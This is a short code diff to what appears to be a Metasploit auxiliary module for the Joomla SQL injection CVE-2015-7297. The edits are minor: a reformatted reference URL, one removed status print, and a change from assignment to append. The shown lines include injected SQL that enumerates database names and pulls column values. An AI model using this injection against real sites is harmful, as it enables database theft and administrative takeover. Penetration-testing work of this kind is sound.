@@ -21,9 +21,7 @@ class Metasploit4 < Msf::Auxiliary
       'References'     =>
         [
           ['CVE', '2015-7297'],
-          ['URL', %q{
-           https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/
-          }]
+          ['URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/Joomla-SQL-Injection-Vulnerability-Exploit-Results-in-Full-Administrative-Access/']
         ],
       'Author'         =>
         [
@@ -83,7 +81,6 @@ class Metasploit4 < Msf::Auxiliary
     query_fmt = '(SELECT MID((IFNULL(CAST(schema_name AS CHAR),0x20)),1,54) '
     query_fmt << 'FROM INFORMATION_SCHEMA.SCHEMATA LIMIT %d,1)'
 
-    print_status('database: ')
     0.upto(dbc.to_i - 1) do |i|
       dbname = request(query_fmt % i)
       dbs << dbname
@@ -156,7 +153,7 @@ class Metasploit4 < Msf::Auxiliary
         loop do
           value = request(query_fmt % [col, l, i])
           break if value.blank?
-          record[col] = value
+          record[col] << value
           l += 54
         end
       end
